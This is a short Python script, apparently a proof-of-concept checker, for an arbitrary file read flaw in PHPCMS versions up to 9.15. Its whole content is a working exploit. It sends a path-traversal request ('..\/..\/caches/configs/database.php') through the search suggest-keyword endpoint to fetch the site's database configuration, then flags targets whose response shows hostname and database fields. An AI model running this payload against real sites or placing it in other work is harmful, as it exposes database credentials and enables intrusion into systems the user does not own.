# /usr/bin/env python
# -*- coding:utf-8 -*-
'''
name: phpcmsv9.15以下任意文件读取漏洞
author: melvyn
description: 影响范围：<=9.15
'''
import requests
import sys

def exp_check(url):
    try:
        url = url.rstrip("/")
        poc = "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=..\/..\/caches/configs/database.php"
        req_url = url + poc
        resp = requests.get(req_url)
        if resp.status_code == 200:
            if "hostname" in resp.text and "database" in resp.text:
                print u"[+]存在phpcmsv9.15以下任意文件读取漏洞...\tpayload: %s"%req_url
    except:
        pass

if __name__ == '__main__':
    exp_check(sys.argv[1])
